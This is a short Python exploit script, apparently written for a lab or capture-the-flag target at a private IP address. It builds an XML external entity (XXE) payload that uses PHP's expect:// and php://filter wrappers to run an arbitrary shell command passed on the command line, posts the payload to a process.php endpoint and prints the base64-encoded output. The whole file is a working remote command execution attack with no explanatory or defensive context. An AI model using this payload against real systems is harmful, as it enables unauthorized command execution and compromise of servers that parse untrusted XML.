import requests
import sys

command = sys.argv[1]

xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=expect://[COMMAND]">]><root><name></name><tel></tel><email>OUT&xxe;OUT</email><password></password></root>'


url = "http://172.16.238.20/process.php"
xml = xml.replace("[COMMAND]", command)
print(xml)
req = requests.post(url, data=xml)
print(req.content)
